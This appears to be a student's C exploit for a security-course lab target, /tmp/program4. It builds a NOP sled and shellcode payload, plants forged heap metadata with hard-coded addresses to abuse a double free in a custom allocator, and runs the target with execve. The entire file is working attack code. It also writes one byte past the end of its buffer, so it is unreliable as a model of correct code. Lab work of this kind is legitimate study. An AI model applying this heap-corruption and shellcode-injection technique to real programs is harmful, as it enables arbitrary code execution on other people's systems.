#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program4"

int main(void)
{
  char *args[3];
  char *environ[1];
  char exploit_str[1024];

  // 1st byte in the exploit_str is 9th byte in arena memory
  for (int i = 0; i < 1024; i++) {
      exploit_str[i] = 0x90;
  }
  exploit_str[1024] = 0x00;

  for (int i = 0; i < strlen(shellcode); i++) {
      exploit_str[512 + i] = shellcode[i];
  }

  *(int*)(exploit_str + 504 + 8 + 308) = 0xffffda4d;
  // prepare metadata for q's double tfree()
  *(int*)(exploit_str + 504) = 0x565606eb;
  *(int*)(exploit_str + 508) = 0x56559398;

  args[0] = PROGRAM;
  args[1] = exploit_str;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
